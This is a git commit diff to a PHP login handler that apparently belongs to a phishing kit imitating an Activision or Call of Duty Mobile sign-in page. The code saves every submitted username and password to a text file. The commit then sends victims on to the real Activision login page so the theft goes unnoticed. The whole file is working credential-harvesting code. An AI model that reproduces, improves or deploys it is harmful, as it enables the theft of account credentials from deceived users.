925f86c0461feb99b584b9439b51d8e33fb1e196
Gr3n0xX <74163590+Ch33chOficial@users.noreply.github.com>
2021-01-04 15:35:23 -0300

    Update login.php

--- sites/Codm/login.php
+++ sites/Codm/login.php
@@ -1,5 +1,5 @@
 <?php
 
 file_put_contents("usernames.txt", "Account: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
-header('Location: index.html');
+header('Location: https://s.activision.com/activision/login?redirectUrl=https%3A%2F%2Fwww.activision.com%2F');
 exit();
